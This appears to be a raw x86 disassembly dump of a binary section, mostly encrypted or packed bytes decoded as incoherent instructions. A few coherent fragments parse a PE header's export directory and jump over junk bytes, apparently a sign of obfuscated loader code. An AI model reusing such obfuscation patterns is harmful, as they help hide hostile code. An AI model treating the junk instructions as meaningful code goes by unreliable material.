  403099:	sub    DWORD PTR [esi-0x6e],ecx
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	mov    bl,0x97
  4030a5:	pop    es
  4030a6:	retf   0x3762
  4030a9:	mov    esi,0x7c11bf1b
  4030ae:	cmp    bl,BYTE PTR ds:0xc94eb847
  4030b4:	and    DWORD PTR [edi-0x6f91060b],ebx
  4030ba:	iret   
  4030bb:	xor    DWORD PTR [esi],esi
  4030bd:	fadd   DWORD PTR [eax+edx*1]
  4030c0:	sar    BYTE PTR [ebx],0x69
  4030c3:	das    
  4030c4:	ret    
  4030c5:	jnp    0x403092
  4030c7:	push   0xffffffc9
  4030c9:	sub    DWORD PTR [edi-0x5f],ebx
  4030cc:	lahf   
  4030cd:	psubd  mm1,QWORD PTR [edx-0x26]
  4030d1:	out    dx,eax
  4030d2:	stos   DWORD PTR es:[edi],eax
  4030d3:	and    BYTE PTR [ebx],cl
  4030d5:	popa   
  4030d6:	push   esp
  4030d7:	cwde   
  4030d8:	mov    eax,0xa6abc1c5
  4030dd:	xor    al,0xa6
  4030df:	shr    ebx,0x8c
  4030e2:	mov    al,0x31
  4030e4:	jo     0x4030d0
  4030e6:	aas    
  4030e7:	mov    eax,ds:0x57adda65
  4030ec:	or     eax,0xc79d9a8b
  4030f1:	ret    
  4030f2:	mov    ebp,0x6641d058
  4030f7:	ror    DWORD PTR [ecx-0x34f1acea],1
  4030fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030fe:	int    0xeb
  403100:	xor    BYTE PTR [edx+0x109b0559],cl
  403106:	rol    BYTE PTR [eax+ecx*8],1
  403109:	mov    ecx,0x6cc110a1
  40310e:	gs jnp 0x403143
  403111:	jae    0x403192
  403113:	jo     0x403184
  403115:	mov    esi,edi
  403117:	lods   al,BYTE PTR ds:[esi]
  403118:	adc    edx,DWORD PTR [edi+0x33]
  40311b:	or     al,0xd
  40311d:	jmp    0x4a8f:0x452608f5
  403124:	push   edx
  403125:	icebp  
  403126:	mov    al,ds:0xff1d718c
  40312b:	mov    ebx,0x64806d4f
  403130:	or     ebx,esi
  403132:	mov    bl,0x78
  403134:	or     edi,DWORD PTR [edi-0x35]
  403137:	rcr    DWORD PTR [esi],1
  403139:	cmc    
  40313a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40313b:	cmp    eax,0x6e85f15d
  403140:	push   0xb
  403142:	adc    DWORD PTR [ecx-0x6d628538],edi
  403148:	sub    dh,BYTE PTR [edi-0x23194ddb]
  40314e:	nop
  40314f:	call   0x46e2:0x6e691ff2
  403156:	mov    ebp,0x14445b0
  40315b:	int3   
  40315c:	mov    BYTE PTR [ecx+ebp*8+0x6b],ah
  403160:	ret    0x1db5
  403163:	jo     0x40313d
  403165:	jp     0x4031b2
  403167:	jno    0x403140
  403169:	and    al,0xf8
  40316b:	xor    cl,BYTE PTR [esi]
  40316d:	je     0x403194
  40316f:	push   es
  403170:	repnz dec eax
  403172:	jl     0x403107
  403174:	dec    ebp
  403175:	adc    esi,esi
  403177:	mov    eax,0x6e8ef59a
  40317c:	(bad)  
  40317d:	out    dx,eax
  40317e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40317f:	add    eax,ebp
  403181:	mov    bl,0x68
  403183:	dec    edi
  403184:	sbb    eax,DWORD PTR [ebx-0x2c]
  403187:	mov    ah,0xbd
  403189:	in     eax,dx
  40318a:	cli    
  40318b:	push   eax
  40318c:	mov    DWORD PTR [edx+0x68],edi
  40318f:	and    edi,DWORD PTR [eax+0x2c6186a1]
  403195:	push   ebx
  403196:	cwde   
  403197:	call   0x9062:0x204cb03a
  40319e:	and    edx,edi
  4031a0:	sahf   
  4031a1:	cli    
  4031a2:	jns    0x4031a1
  4031a4:	mov    ds:0x7173e49c,al
  4031a9:	out    dx,eax
  4031aa:	lss    ebx,FWORD PTR [edi]
  4031ad:	jo     0x403159
  4031af:	xchg   DWORD PTR [eax+0x3e35bb12],esi
  4031b5:	inc    ebp
  4031b6:	mov    cl,0xe9
  4031b8:	adc    bh,BYTE PTR [esp+ecx*8]
  4031bb:	push   esi
  4031bc:	xor    ah,dl
  4031be:	and    bh,BYTE PTR [ebp+0x22f00396]
  4031c4:	iret   
  4031c5:	sub    DWORD PTR [ecx-0x31],0xcd8a8292
  4031cc:	inc    ecx
  4031cd:	add    ecx,DWORD PTR [esi+0x12]
  4031d0:	inc    esp
  4031d1:	cli    
  4031d2:	repz les eax,FWORD PTR [edi+eiz*8-0x3d]
  4031d7:	jbe    0x403175
  4031d9:	or     BYTE PTR ss:[esi],dh
  4031dc:	(bad)  
  4031de:	sbb    eax,0x292824b2
  4031e3:	stos   BYTE PTR es:[edi],al
  4031e4:	or     al,0x7f
  4031e6:	push   edi
  4031e7:	sub    DWORD PTR [esi+0x70],0x4750f177
  4031ee:	xor    edi,DWORD PTR [esi+0x548a326e]
  4031f4:	mov    ah,BYTE PTR [eax+ebx*2-0x19440c47]
  4031fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031fc:	shr    DWORD PTR [edi],0xcc
  4031ff:	mov    ch,BYTE PTR [eax+0x6a0d8794]
  403205:	inc    ebx
  403206:	and    ch,0xed
  403209:	cmp    BYTE PTR [edx],ah
  40320b:	sub    al,0xc5
  40320d:	(bad)  
  40320e:	(bad)  
  40320f:	mov    ds:0x1205a67f,eax
  403214:	mov    edx,0x8dd24994
  403219:	jg     0x40323b
  40321b:	mov    esp,0x530c871
  403220:	inc    ecx
  403221:	mov    esi,0xd328d1a9
  403226:	cmc    
  403227:	inc    esp
  403228:	sbb    BYTE PTR [eax-0x3698da9e],al
  40322e:	jle    0x403254
  403230:	gs pop esp
  403232:	push   esp
  403233:	in     al,0x49
  403235:	mov    ds:0xf3174f53,eax
  40323a:	jno    0x4031ef
  40323c:	sbb    eax,0x1d1a11a4
  403241:	call   0x51b1576e
  403246:	test   ch,dh
  403248:	sbb    DWORD PTR [eax+ecx*4-0x2eb72d8d],ecx
  40324f:	lock inc eax
  403251:	inc    esp
  403252:	mov    ss,WORD PTR [esi+0x4828d031]
  403258:	(bad)  
  40325a:	pop    edi
  40325b:	and    BYTE PTR [esi],cl
  40325d:	push   es
  40325e:	push   cs
  40325f:	xchg   ebp,eax
  403260:	sbb    DWORD PTR [eax+0x76af79a0],0xffffffb1
  403267:	xchg   DWORD PTR [esi],edi
  403269:	and    al,0xc1
  40326b:	push   esp
  40326c:	jl     0x40324a
  40326e:	lods   al,BYTE PTR ds:[esi]
  40326f:	or     eax,0xf7246977
  403274:	jns    0x4032f5
  403276:	scas   eax,DWORD PTR es:[edi]
  403277:	push   cs
  403278:	xchg   ecx,eax
  403279:	aam    0x70
  40327b:	pop    ds
  40327c:	(bad)  
  40327d:	inc    esp
  40327e:	jns    0x4032eb
  403280:	dec    edx
  403281:	xchg   edx,eax
  403282:	dec    ebp
  403283:	cs ja  0x4032c0
  403286:	or     edi,DWORD PTR [eax-0x7d]
  403289:	pop    ebx
  40328a:	jno    0x4032ed
  40328c:	aas    
  40328d:	mov    ebp,0x3452e3aa
  403292:	push   esp
  403293:	cwde   
  403294:	push   cs
  403295:	mov    esi,0xa3638154
  40329a:	push   eax
  40329b:	add    esi,DWORD PTR [ebx-0x61]
  40329e:	mov    WORD PTR [ebx],cs
  4032a0:	(bad)  
  4032a1:	jp     0x4032a8
  4032a3:	(bad)  
  4032a4:	jo     0x4032bb
  4032a6:	adc    DWORD PTR [ecx+0x1a],esi
  4032a9:	fldcw  WORD PTR [eax+edi*2]
  4032ac:	adc    al,0xcd
  4032ae:	lods   eax,DWORD PTR ds:[esi]
  4032af:	xor    DWORD PTR [edx],0xa9f47ee5
  4032b5:	iretw  
  4032b7:	add    DWORD PTR [edi+0x29],0x784cbb48
  4032be:	mul    BYTE PTR [edi+0x53453959]
  4032c4:	or     ebx,DWORD PTR [ecx+eiz*2-0x4f]
  4032c8:	dec    edx
  4032c9:	pusha  
  4032ca:	shl    esi,1
  4032cc:	xor    ah,BYTE PTR [ebp+0x2e]
  4032cf:	jo     0x4032de
  4032d1:	sub    ebp,0x3a
  4032d4:	xchg   BYTE PTR es:0x1d6e57d4,dh
  4032db:	cmp    eax,0x68673ae9
  4032e0:	(bad)  
  4032e1:	xchg   ebx,eax
  4032e2:	pop    edx
  4032e3:	dec    edi
  4032e4:	xchg   esi,eax
  4032e5:	push   DWORD PTR [edi-0x7f]
  4032e8:	mov    ebp,0x347e5092
  4032ed:	lds    ebx,FWORD PTR [esi+edi*2-0x21]
  4032f1:	jb     0x4032ea
  4032f3:	add    al,bl
  4032f5:	xlat   BYTE PTR ds:[ebx]
  4032f6:	cmp    al,0x8e
  4032f8:	push   esi
  4032f9:	xor    BYTE PTR [ebp-0x1c],0xc6
  4032fd:	push   edi
  4032fe:	in     eax,dx
  4032ff:	jg     0x403363
  403301:	mov    bh,0x1
  403303:	rol    DWORD PTR [ebx+0x39a5064],cl
  403309:	nop
  40330a:	stos   BYTE PTR es:[di],al
  40330c:	jle    0x4032b3
  40330e:	jne    0x4032d4
  403310:	iret   
  403311:	sub    BYTE PTR [ecx-0x10],dh
  403314:	adc    BYTE PTR [edx+0x78],dh
  403317:	sti    
  403318:	or     edi,DWORD PTR [ebp-0x64]
  40331b:	mov    cl,0x4b
  40331d:	loope  0x4032c7
  40331f:	push   esi
  403320:	ror    BYTE PTR [ecx-0x67],cl
  403323:	adc    eax,0x3c633fa
  403328:	(bad)  
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0xb3dc34a]
  403372:	jo     0x4033ab
  403374:	outs   dx,DWORD PTR ds:[esi]
  403375:	adc    BYTE PTR [edx],bl
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x4033d8
  40337e:	dec    eax
  40337f:	add    esi,edi
  403381:	xchg   ebp,eax
  403382:	ret    
  403383:	add    edx,DWORD PTR gs:[ecx-0x40]
  403387:	xchg   ecx,eax
  403388:	ss into 
  40338a:	cli    
  40338b:	popa   
  40338c:	test   DWORD PTR [edx+0x3b],eax
  40338f:	and    edx,DWORD PTR [edx+eiz*1]
  403392:	dec    esp
  403393:	mov    ebp,0x1cd05b65
  403398:	xchg   BYTE PTR [ebp+0x13],bh
  40339b:	fimul  DWORD PTR [edx+0x1e6fd3a8]
  4033a1:	pop    eax
  4033a2:	popf   
  4033a3:	jl     0x4033f7
  4033a5:	into   
  4033a6:	lahf   
  4033a7:	ins    DWORD PTR es:[edi],dx
  4033a8:	push   ecx
  4033a9:	xchg   ebx,eax
  4033aa:	pop    edx
  4033ab:	call   DWORD PTR [eax+0x7c]
  4033ae:	xchg   ecx,eax
  4033af:	sub    bh,ch
  4033b1:	jbe    0x40334a
  4033b3:	mov    dh,0x10
  4033b5:	pop    ebp
  4033b6:	jb     0x403358
  4033b8:	sub    BYTE PTR [ebp-0x26],al
  4033bb:	push   ebx
  4033bc:	sub    dh,BYTE PTR [edx]
  4033be:	sub    eax,0xdf228d56
  4033c3:	add    al,BYTE PTR [ebp-0x10c46b03]
  4033c9:	fild   WORD PTR [edi+0x24]
  4033cc:	xor    eax,0x231923cd
  4033d1:	int3   
  4033d2:	mov    ebx,edx
  4033d4:	scas   eax,DWORD PTR es:[edi]
  4033d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033d6:	jno    0x403394
  4033d8:	pushf  
  4033d9:	and    al,0x4d
  4033db:	adc    eax,DWORD PTR [edx]
  4033dd:	stos   BYTE PTR es:[edi],al
  4033de:	ret    0xcc3d
  4033e1:	dec    ebp
  4033e2:	out    0xa3,eax
  4033e4:	sar    DWORD PTR [ecx+0x4a],0xc1
  4033e8:	inc    eax
  4033e9:	test   BYTE PTR [edx+0x54],bl
  4033ec:	xor    al,0x9b
  4033ee:	int    0xc7
  4033f0:	cwde   
  4033f1:	aas    
  4033f2:	xchg   ebp,eax
  4033f3:	mov    dl,0x4d
  4033f5:	mov    BYTE PTR [ebx],cl
  4033f7:	push   edx
  4033f8:	scas   eax,DWORD PTR es:[edi]
  4033f9:	jnp    0x4033cc
  4033fb:	sti    
  4033fc:	fnsave [esp+ecx*8+0x46]
  403400:	mov    ds:0x3e38cab0,eax
  403405:	loopne 0x40342f
  403407:	mov    ds:0x713d9f3f,al
  40340c:	adc    BYTE PTR [edi-0x3],ah
  40340f:	xchg   ecx,eax
  403410:	std    
  403411:	lods   eax,DWORD PTR ds:[esi]
  403412:	stos   DWORD PTR es:[edi],eax
  403413:	and    BYTE PTR [edx],dh
  403415:	cmp    BYTE PTR [ecx-0xe],0x4f
  403419:	popa   
  40341a:	mov    dl,0xe4
  40341c:	push   ebx
  40341d:	daa    
  40341e:	or     BYTE PTR [ebp-0x69d94bc8],ch
  403424:	add    esp,DWORD PTR [ecx-0x3e9290ca]
  40342a:	sub    eax,0x32a6172b
  40342f:	cmp    eax,0x4ebd393e
  403434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403435:	cmp    eax,0x80d851e4
  40343a:	ret    0x695c
  40343d:	clc    
  40343e:	sbb    dl,cl
  403440:	ds push ss
  403442:	cs jle 0x4033f1
  403445:	cmp    BYTE PTR [edi-0x2c65a266],cl
  40344b:	int    0xc4
  40344d:	mov    edx,0xbf3acff3
  403452:	retf   
  403453:	add    BYTE PTR [eax+0x5a2ceeed],ah
  403459:	fwait
  40345a:	sub    eax,0x2689c767
  40345f:	jnp    0x403413
  403461:	or     BYTE PTR [edi-0x1892350b],dh
  403467:	and    eax,0x90ef9242
  40346c:	(bad)  
  40346d:	pop    ebp
  40346e:	test   eax,0x7a076a5f
  403473:	clc    
  403474:	leave  
  403475:	inc    BYTE PTR [ecx+ebx*2+0xa31bf5a]
  40347c:	mov    ds:0x723c253,eax
  403481:	adc    dh,BYTE PTR [esi]
  403483:	test   eax,0x6de35626
  403488:	xor    DWORD PTR [esi+eiz*4+0x5dd1b2a],eax
  40348f:	mov    ds:0x70aec0e4,eax
  403494:	fsub   st(2),st
  403496:	imul   eax,DWORD PTR [edi],0xe01cb1e9
  40349c:	mov    ebp,DWORD PTR [esi+0x32]
  40349f:	mov    al,ds:0x819dc012
  4034a4:	enter  0x24e,0x25
  4034a8:	dec    eax
  4034a9:	xchg   edx,ebx
  4034ab:	in     al,dx
  4034ac:	xchg   ebx,eax
  4034ad:	mov    fs,WORD PTR [esi-0x16]
  4034b0:	addr16 pop ss
  4034b2:	and    esi,DWORD PTR [ecx-0x6e]
  4034b5:	xor    BYTE PTR [edi],bl
  4034b7:	stos   BYTE PTR es:[edi],al
  4034b8:	sti    
  4034b9:	das    
  4034ba:	inc    ebp
  4034bb:	jle    0x403456
  4034bd:	sbb    esi,edi
  4034bf:	push   cs
  4034c0:	cmp    al,0x13
  4034c2:	in     eax,dx
  4034c3:	repz mov ch,0xcf
  4034c6:	xchg   esp,eax
  4034c7:	ins    BYTE PTR es:[edi],dx
  4034c8:	das    
  4034c9:	adc    BYTE PTR [edx-0x706af1c5],bh
  4034cf:	sub    eax,0xa7f3223f
  4034d4:	sub    bh,ch
  4034d6:	test   al,0x8e
  4034d8:	ss adc eax,0xf7ea997c
  4034de:	test   BYTE PTR [ecx-0x63],ch
  4034e1:	cmp    eax,DWORD PTR [edx-0x6f790cc5]
  4034e7:	jns    0x4034b3
  4034e9:	fistp  QWORD PTR [eax]
  4034eb:	jle    0x4034a7
  4034ed:	and    edx,DWORD PTR [eax+ebx*2-0x3a8f25ee]
  4034f4:	adc    ch,BYTE PTR [eax+0x25]
  4034f7:	xchg   esp,eax
  4034f8:	cmc    
  4034f9:	dec    esp
  4034fa:	or     bl,BYTE PTR [esi]
  4034fc:	or     cl,BYTE PTR [edx+esi*1-0x3c626b15]
  403503:	call   0x1874:0xb242aa2b
  40350a:	aam    0xb
  40350c:	hlt    
  40350d:	mov    ds:0x3e8b83b7,al
  403512:	sbb    cl,cl
  403514:	cmp    BYTE PTR [eax-0x44a04f6b],ah
  40351a:	and    ah,dh
  40351c:	cmc    
  40351d:	call   0x20c6:0x70ca3dd4
  403524:	jmp    0x403537
  403526:	iret   
  403527:	pop    ss
  403528:	ficom  WORD PTR [esi+0x7c]
  40352b:	xor    BYTE PTR [esi-0x69e3a3dd],dl
  403531:	and    bl,cl
  403533:	fsub   QWORD PTR [edx-0x3d]
  403536:	sti    
  403537:	and    al,0x57
  403539:	dec    ebp
  40353a:	in     al,dx
  40353b:	(bad)  
  40353c:	fs cmp al,0x30
  40353f:	cmp    edx,DWORD PTR [ebp-0x18]
  403542:	sbb    ebp,DWORD PTR [eax+0x3e8a2a56]
  403548:	mov    eax,0x2baac721
  40354d:	mov    ds:0xa525a11e,eax
  403552:	mov    dl,0x1e
  403554:	jmp    0xdcb1:0x4d26900a
  40355b:	out    0x88,eax
  40355d:	arpl   WORD PTR [ecx+0x24],bp
  403560:	jnp    0x4035a3
  403562:	cdq    
  403563:	jo     0x403577
  403565:	adc    edi,DWORD PTR [ecx+edi*4+0xa849e2f]
  40356c:	inc    edi
  40356d:	mov    WORD PTR [ebx+0x3e],?
  403570:	daa    
  403571:	fsubr  st,st(5)
  403573:	lea    eax,[edx+edx*2+0x32]
  403577:	jne    0x403545
  403579:	fistp  QWORD PTR [esi]
  40357b:	push   esi
  40357c:	or     BYTE PTR [esi+0x18],0xb
  403580:	gs dec esi
  403582:	rol    BYTE PTR [esi-0x3e48cc87],1
  403588:	mov    dh,0x94
  40358a:	mov    dl,0x33
  40358c:	or     esi,ecx
  40358e:	fisub  WORD PTR [edi]
  403590:	xchg   DWORD PTR [esp+edi*2+0x6],esi
  403594:	test   BYTE PTR [ecx-0x2aee923d],0x50
  40359b:	xor    dh,BYTE PTR [esi]
  40359d:	clc    
  40359e:	enter  0x3339,0x89
  4035a2:	test   eax,0xe4ae201d
  4035a7:	inc    ebp
  4035a8:	pop    ebx
  4035a9:	rol    BYTE PTR [ebp-0x418d1fb9],1
  4035af:	sub    cl,0xc2
  4035b2:	mov    ds:0x28b01dcd,al
  4035b7:	fs jg  0x4035bd
  4035ba:	loope  0x403631
  4035bc:	jbe    0x403634
  4035be:	(bad)  
  4035bf:	dec    ebx
  4035c0:	gs dec esp
  4035c2:	cmp    eax,0x28359fb1
  4035c7:	sar    edx,cl
  4035c9:	mov    bl,0x96
  4035cb:	push   cs
  4035cc:	pop    ss
  4035cd:	aas    
  4035ce:	and    BYTE PTR [esp+esi*4-0x111e8462],bh
  4035d5:	push   esi
  4035d6:	les    esp,FWORD PTR [ecx-0x5ec71c28]
  4035dc:	push   ebp
  4035dd:	inc    edx
  4035de:	mov    ?,WORD PTR [edx+0x18b766c8]
  4035e4:	adc    DWORD PTR [edi+0x40],esi
  4035e7:	push   ecx
  4035e8:	jge    0x4035c5
  4035ea:	lock pop eax
  4035ec:	pushf  
  4035ed:	sub    al,0xe6
  4035ef:	aas    
  4035f0:	xlat   BYTE PTR ds:[ebx]
  4035f1:	sar    edx,0x4e
  4035f4:	sub    ebp,DWORD PTR [ebx-0x46475410]
  4035fa:	rcl    BYTE PTR [esi+0x338bc21a],cl
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x37f3c0fd,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x40366d
  40363f:	sbb    DWORD PTR [eax+0x39451ca0],0x1daec86
  403649:	jle    0x40368a
  40364b:	sbb    BYTE PTR [ecx],dh
  40364d:	pusha  
  40364e:	xor    eax,0xa0febcab
  403653:	mov    WORD PTR [ebp-0x45],ds
  403656:	ret    
  403657:	lods   al,BYTE PTR ds:[esi]
  403658:	js     0x40362a
  40365a:	xchg   ebp,eax
  40365b:	cli    
  40365c:	lock cmp cl,ah
  40365f:	mul    DWORD PTR [edi-0x58]
  403662:	mov    dl,0x84
  403664:	xchg   ebx,eax
  403665:	sbb    al,0xf4
  403667:	lods   eax,DWORD PTR ds:[esi]
  403668:	pop    edx
  403669:	pushf  
  40366a:	dec    ebx
  40366b:	cdq    
  40366c:	shr    edx,0x8f
  40366f:	stos   BYTE PTR es:[edi],al
  403670:	(bad)  
  403671:	cmp    eax,0x61dfd621
  403676:	ja     0x4036ca
  403678:	sbb    cl,ah
  40367a:	add    esp,DWORD PTR [ebx+0xed3e4d6]
  403680:	aam    0xfb
  403682:	push   ebp
  403683:	cmp    al,0xa4
  403685:	sar    DWORD PTR [eax-0x4aa62c88],cl
  40368b:	je     0x403689
  40368d:	push   ecx
  40368e:	mov    dl,0x6a
  403690:	xchg   esi,eax
  403691:	sub    esi,eax
  403693:	fisttp QWORD PTR [ecx+0x5d9a12ed]
  403699:	add    edi,ecx
  40369b:	push   eax
  40369c:	jp     0x4036ca
  40369e:	in     eax,0x75
  4036a0:	sub    esi,DWORD PTR [eax+0x6b]
  4036a3:	jmp    0x403648
  4036a5:	cdq    
  4036a6:	jnp    0x40369f
  4036a8:	or     al,0x7d
  4036aa:	jmp    0x7aaf:0xd2e38474
  4036b1:	cmp    edi,DWORD PTR [edx]
  4036b3:	sbb    eax,ebp
  4036b5:	mov    ds:0xd5c4c8fa,eax
  4036ba:	ja     0x40369b
  4036bc:	js     0x40364f
  4036be:	mov    bl,BYTE PTR [ecx]
  4036c0:	rol    BYTE PTR [ebp-0x4f],1
  4036c3:	jno    0x4036f6
  4036c5:	leave  
  4036c6:	jg     0x4036b6
  4036c8:	mov    eax,0x9210fd6b
  4036cd:	ds enter 0x79c3,0xea
  4036d2:	daa    
  4036d3:	sbb    eax,esp
  4036d5:	pop    esi
  4036d6:	nop
  4036d7:	cli    
  4036d8:	(bad)  
  4036d9:	retw   0xb058
  4036dd:	adc    DWORD PTR [ebx],ebp
  4036df:	pop    ss
  4036e0:	pop    esp
  4036e1:	push   esi
  4036e2:	mov    bl,0x56
  4036e4:	(bad)  
  4036e5:	mov    edi,edi
  4036e7:	jae    0x403707
  4036e9:	pop    ds
  4036ea:	out    0xc6,al
  4036ec:	lss    eax,FWORD PTR ds:0x8c930c7f
  4036f3:	lods   eax,DWORD PTR ds:[esi]
  4036f4:	test   DWORD PTR [ebx+0x181eb477],0xe197c59b
  4036fe:	ja     0x40372e
  403700:	adc    DWORD PTR [ebp-0x29],ebx
  403703:	out    dx,al
  403704:	(bad)
  403707:	mov    esi,0xa436cadd
  40370c:	dec    ecx
  40370d:	dec    edx
  40370e:	push   es
  40370f:	lds    ecx,FWORD PTR fs:[esi]
  403712:	not    DWORD PTR [esi]
  403714:	ds loopne 0x4036af
  403717:	add    eax,0xf885ccea
  40371c:	fsub   DWORD PTR ds:0xbe5a3bb9
  403722:	and    ebp,DWORD PTR [ecx+0x3b]
  403725:	ins    DWORD PTR es:[edi],dx
  403726:	mov    al,0x88
  403728:	add    BYTE PTR [eax+ecx*4+0x2a63cb5c],0x14
  403730:	xchg   edx,eax
  403731:	mov    BYTE PTR [eax-0x3],dh
  403734:	lahf   
  403735:	jmp    0x65bf12f2
  40373a:	js     0x4037a2
  40373c:	xor    dh,BYTE PTR [ecx+0x41d6cffc]
  403742:	lea    ebx,[ecx+0x3f]
  403745:	sbb    cl,dh
  403747:	fdiv   DWORD PTR [ebp-0x1e]
  40374a:	fwait
  40374b:	sar    BYTE PTR [esi+0x58],cl
  40374e:	sub    al,0x50
  403750:	and    al,0x5b
  403752:	jle    0x4037c9
  403754:	das    
  403755:	ds cmc 
  403757:	mov    edi,0xc14ded3d
  40375c:	mov    cl,BYTE PTR [eax+0xf]
  40375f:	loopne 0x403710
  403761:	arpl   WORD PTR [esi-0x1c],si
  403764:	jl     0x4037cd
  403766:	imul   ecx,ebx,0x5d168953
  40376c:	sbb    eax,0xcf899efb
  403771:	sub    DWORD PTR [esi+0x58],esi
  403774:	push   ds
  403775:	and    edx,DWORD PTR [ebp-0xf]
  403778:	mov    WORD PTR [edi+ecx*2-0x33ef9a],ds
  40377f:	sub    al,0xaa
  403781:	adc    DWORD PTR [ecx],ebp
  403783:	ror    DWORD PTR [ebx-0x6c7fb1f7],0xc4
  40378a:	inc    eax
  40378b:	or     eax,0xedf01917
  403790:	cli    
  403791:	daa    
  403792:	fwait
  403793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403794:	inc    esp
  403795:	dec    edi
  403796:	xor    BYTE PTR [ecx+edx*1],ch
  403799:	stc    
  40379a:	mov    cl,0x4b
  40379c:	mov    al,ds:0x116e8d14
  4037a1:	hlt    
  4037a2:	pop    esp
  4037a3:	push   esi
  4037a4:	icebp  
  4037a5:	inc    edx
  4037a6:	push   ebp
  4037a7:	push   eax
  4037a8:	jl     0x40380b
  4037aa:	enter  0x339b,0xbe
  4037ae:	outs   dx,DWORD PTR ds:[esi]
  4037af:	ret    0xedaa
  4037b2:	mov    ch,0x74
  4037b4:	dec    edx
  4037b5:	(bad)  
  4037b6:	jmp    0x4037de
  4037b8:	jno    0x40373f
  4037ba:	jg     0x403793
  4037bc:	les    ebp,FWORD PTR [ecx]
  4037be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037bf:	aad    0x78
  4037c1:	cdq    
  4037c2:	dec    ebx
  4037c3:	test   DWORD PTR ds:0xea9d00ac,esp
  4037c9:	mov    ebx,0x257eea75
  4037ce:	pop    ds
  4037cf:	fstp   DWORD PTR [edx-0x1d87ac4b]
  4037d5:	pop    edx
  4037d6:	fsubp  st(7),st
  4037d8:	sub    bl,bl
  4037da:	popa   
  4037db:	push   ss
  4037dc:	xchg   ebx,eax
  4037dd:	in     al,0x9e
  4037df:	and    DWORD PTR [edx],ebx
  4037e1:	lods   eax,DWORD PTR ds:[esi]
  4037e2:	xor    eax,0x95ca1f3
  4037e7:	adc    al,0xa2
  4037e9:	loopne 0x403859
  4037eb:	stc    
  4037ec:	fcmove st,st(3)
  4037ee:	adc    al,0x63
  4037f0:	mov    ds:0x43efdce2,eax
  4037f5:	(bad)  [esi-0x6afa692d]
  4037fb:	pop    edx
  4037fc:	ds push cs
  4037fe:	push   esp
  4037ff:	ins    DWORD PTR es:[edi],dx
  403800:	or     BYTE PTR [eax],0xb4
  403803:	xchg   edi,eax
  403804:	outs   dx,BYTE PTR ds:[esi]
  403805:	(bad)  
  403806:	adc    al,0x30
  403808:	ins    DWORD PTR es:[edi],dx
  403809:	push   edx
  40380a:	in     al,0x75
  40380c:	ins    BYTE PTR es:[edi],dx
  40380d:	mov    edi,esp
  40380f:	add    eax,0xfc47765c
  403814:	in     al,0x75
  403816:	les    esp,FWORD PTR [eax+0x63917c41]
  40381c:	into   
  40381d:	ja     0x40384a
  40381f:	int    0x2b
  403821:	jmp    0x77d3:0x7df1196d
  403828:	(bad)  
  403829:	int3   
  40382a:	add    BYTE PTR [ebp+0xaeaaa9e],0xcc
  403831:	add    eax,ecx
  403833:	add    al,0x9b
  403835:	je     0x40385a
  403837:	loopne 0x403875
  403839:	in     eax,dx
  40383a:	push   ebx
  40383b:	inc    esp
  40383c:	in     al,dx
  40383d:	stos   BYTE PTR es:[edi],al
  40383e:	test   al,0x1f
  403840:	popa   
  403841:	es push 0xf4d85c9e
  403847:	nop
  403848:	dec    esi
  403849:	gs cmp al,al
  40384c:	jnp    0x403851
  40384e:	lods   al,BYTE PTR ds:[esi]
  40384f:	jp     0x4037ec
  403851:	adc    eax,0xb3211715
  403856:	(bad)  
  403857:	nop
  403858:	ret    
  403859:	iret   
  40385a:	shl    edx,cl
  40385c:	push   edx
  40385d:	ror    BYTE PTR [ecx+0x14624d66],cl
  403863:	sbb    dl,ah
  403865:	sub    cl,BYTE PTR [ebp+0x2d83eeef]
  40386b:	ret    
  40386c:	sbb    ch,BYTE PTR [ebx-0x4cf32251]
  403872:	(bad)  
  403873:	hlt    
  403874:	sti    
  403875:	retf   
  403876:	pop    ecx
  403877:	ss retf 0xb082
  40387b:	mov    dh,0x38
  40387d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40387e:	jmp    0x673cd1bb
  403883:	shl    ebx,0x97
  403886:	cli    
